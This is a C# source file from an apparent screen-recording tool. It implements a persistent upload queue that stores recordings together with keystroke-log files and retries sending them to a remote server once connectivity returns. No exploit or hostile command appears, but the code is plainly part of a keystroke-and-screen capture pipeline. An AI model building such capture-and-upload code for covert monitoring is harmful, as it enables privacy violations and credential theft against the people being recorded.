using System;
using System.Collections.Generic;
using System.IO;
using System.Text.Json;
using System.Threading.Tasks;
using System.Timers;

namespace ScreenRecorder
{
    /// <summary>
    /// 上传队列管理器，用于管理断网续传功能
    /// </summary>
    public class UploadQueueManager : IDisposable
    {
        private string queueFilePath = Path.Combine(Environment.CurrentDirectory, "upload_queue.json");
        private List<UploadQueueItem> uploadQueue = new List<UploadQueueItem>();
        private System.Timers.Timer? networkCheckTimer;
        private bool wasNetworkAvailable = true; // 上次检查时的网络状态
        private bool isDisposed = false;
        private readonly object queueLock = new object();

        // 网络恢复事件，供外部订阅
        public event EventHandler? NetworkRestored;

        /// <summary>
        /// 构造函数，加载已有的上传队列并启动网络监测
        /// </summary>
        public UploadQueueManager()
        {
            uploadQueue = LoadQueue();
            StartNetworkCheckTimer();
        }

        /// <summary>
        /// 启动网络状态监测定时器
        /// </summary>
        private void StartNetworkCheckTimer()
        {
            // 每30秒检查一次网络状态
            networkCheckTimer = new System.Timers.Timer(30000);
            networkCheckTimer.Elapsed += async (sender, e) => await CheckNetworkStatusChangeAsync();
            networkCheckTimer.Start();
        }

        /// <summary>
        /// 检查网络状态变化并在恢复时自动尝试上传
        /// </summary>
        private async Task CheckNetworkStatusChangeAsync()
        {
            try
            {
                bool isNetworkAvailable = await IsNetworkAvailableAsync();
                
                Console.WriteLine($"网络状态检查 - 当前状态: {isNetworkAvailable}, 上次状态: {wasNetworkAvailable}");
                
                // 检测到网络从不可用变为可用
                if (isNetworkAvailable && !wasNetworkAvailable)
                {
                    Console.WriteLine("检测到网络已从不可用变为可用，触发网络恢复事件...");
                    // 触发网络恢复事件
                    OnNetworkRestored();
                }
                
                wasNetworkAvailable = isNetworkAvailable;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"检查网络状态时出错: {ex.Message}");
            }
        }

        /// <summary>
        /// 触发网络恢复事件
        /// </summary>
        protected virtual void OnNetworkRestored()
        {
            NetworkRestored?.Invoke(this, EventArgs.Empty);
        }

        /// <summary>
        /// 添加文件到上传队列
        /// </summary>
        /// <param name="filePath">文件路径</param>
        /// <param name="keylogFilePath">键盘记录文件路径</param>
        public void AddToQueue(string filePath, string? keylogFilePath = null)
        {
            if (string.IsNullOrEmpty(filePath) || !File.Exists(filePath))
                return;

            lock (queueLock)
            {
                try
                {
                    // 检查文件是否已在队列中
                    if (!uploadQueue.Exists(item => item.FilePath.Equals(filePath, StringComparison.OrdinalIgnoreCase)))
                    {
                        UploadQueueItem newItem = new UploadQueueItem
                        {
                            FilePath = filePath,
                            KeylogFilePath = keylogFilePath ?? string.Empty,
                            AddedTime = DateTime.Now
                        };

                        uploadQueue.Add(newItem);
                        SaveQueue(uploadQueue);
                        Console.WriteLine($"文件已添加到上传队列: {filePath}");
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"添加文件到上传队列时出错: {ex.Message}");
                }
            }
        }

        /// <summary>
        /// 从上传队列中移除文件
        /// </summary>
        /// <param name="filePath">文件路径</param>
        public void RemoveFromQueue(string filePath)
        {
            lock (queueLock)
            {
                try
                {
                    uploadQueue.RemoveAll(item => item.FilePath.Equals(filePath, StringComparison.OrdinalIgnoreCase));
                    SaveQueue(uploadQueue);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"从上传队列中移除文件时出错: {ex.Message}");
                }
            }
        }

        /// <summary>
        /// 获取上传队列中的所有文件
        /// </summary>
        /// <returns>上传队列列表</returns>
        public List<UploadQueueItem> GetQueue()
        {
            lock (queueLock)
            {
                try
                {
                    return new List<UploadQueueItem>(uploadQueue);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"获取上传队列时出错: {ex.Message}");
                    return new List<UploadQueueItem>();
                }
            }
        }

        /// <summary>
        /// 尝试上传队列中的所有文件
        /// </summary>
        /// <param name="fileUploader">文件上传器实例</param>
        /// <returns>成功上传的文件数</returns>
        public async Task<int> TryUploadQueueFilesAsync(FileUploader fileUploader)
        {
            if (fileUploader == null)
                return 0;

            int successCount = 0;
            
            // 先检查网络连接
            if (!await IsNetworkAvailableAsync())
            {
                Console.WriteLine("网络不可用，无法上传队列中的文件");
                return 0;
            }
            
            lock (queueLock)
            {
                uploadQueue = LoadQueue(); // 确保使用最新的队列数据
            }

            List<UploadQueueItem> tempQueue = GetQueue();

            if (tempQueue.Count == 0)
            {
                Console.WriteLine("上传队列为空，无需上传");
                return 0;
            }
            
            Console.WriteLine($"开始上传队列中的 {tempQueue.Count} 个文件...");

            foreach (UploadQueueItem item in tempQueue)
            {
                if (File.Exists(item.FilePath))
                {
                    try
                    {
                        // 检查网络连接
                        if (await IsNetworkAvailableAsync())
                        {
                            Console.WriteLine($"尝试上传队列中的文件: {item.FilePath}");
                            bool success = await fileUploader.UploadToRemoteServerAsync(item.FilePath, item.KeylogFilePath);

                            if (success)
                            {
                                RemoveFromQueue(item.FilePath);
                                successCount++;
                                Console.WriteLine($"文件上传成功，已从队列中移除: {item.FilePath}");
                            }
                            else
                            {
                                Console.WriteLine($"文件上传失败，保留在队列中: {item.FilePath}");
                            }
                        }
                        else
                        {
                            Console.WriteLine("上传过程中网络断开连接，暂停上传队列中的文件");
                            // 网络不可用时返回已成功上传的数量，而不是使用break完全停止
                            return successCount;
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"上传队列文件时出错: {ex.Message}");
                    }
                }
                else
                {
                    // 文件不存在，从队列中移除
                    RemoveFromQueue(item.FilePath);
                }

                // 上传间隔，避免服务器请求过于频繁
                await Task.Delay(1000);
            }

            Console.WriteLine($"队列文件上传完成，成功上传 {successCount} 个文件");
            return successCount;
        }

        /// <summary>
        /// 检查网络连接是否可用
        /// </summary>
        /// <returns>网络是否可用</returns>
        private async Task<bool> IsNetworkAvailableAsync()
        {
            try
            {
                using (var httpClient = new System.Net.Http.HttpClient())
                {
                    httpClient.Timeout = TimeSpan.FromSeconds(5);
                    // 尝试连接到服务器URL或其他可靠的网络资源
                    var response = await httpClient.GetAsync("http://www.gstatic.com/generate_204");
                    return response.IsSuccessStatusCode;
                }
            }
            catch
            {
                return false;
            }
        }

        /// <summary>
        /// 加载上传队列
        /// </summary>
        /// <returns>上传队列列表</returns>
        private List<UploadQueueItem> LoadQueue()
        {
            if (!File.Exists(queueFilePath))
                return new List<UploadQueueItem>();

            try
            {
                string json = File.ReadAllText(queueFilePath);
                return JsonSerializer.Deserialize<List<UploadQueueItem>>(json) ?? new List<UploadQueueItem>();
            }
            catch (Exception)
            {
                return new List<UploadQueueItem>();
            }
        }

        /// <summary>
        /// 保存上传队列
        /// </summary>
        /// <param name="queue">上传队列列表</param>
        private void SaveQueue(List<UploadQueueItem> queue)
        {
            try
            {
                string json = JsonSerializer.Serialize(queue, new JsonSerializerOptions { WriteIndented = true });
                File.WriteAllText(queueFilePath, json);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"保存上传队列时出错: {ex.Message}");
            }
        }

        /// <summary>
        /// 释放资源
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        /// <summary>
        /// 释放资源
        /// </summary>
        /// <param name="disposing">是否由用户代码调用</param>
        protected virtual void Dispose(bool disposing)
        {
            if (!isDisposed)
            {
                if (disposing)
                {
                    // 释放托管资源
                    networkCheckTimer?.Stop();
                    networkCheckTimer?.Dispose();
                }
                
                isDisposed = true;
            }
        }

        /// <summary>
        /// 上传队列项类
        /// </summary>
        public class UploadQueueItem
        {
            public string FilePath { get; set; } = string.Empty;
            public string KeylogFilePath { get; set; } = string.Empty;
            public DateTime AddedTime { get; set; } = DateTime.Now;
        }
    }
}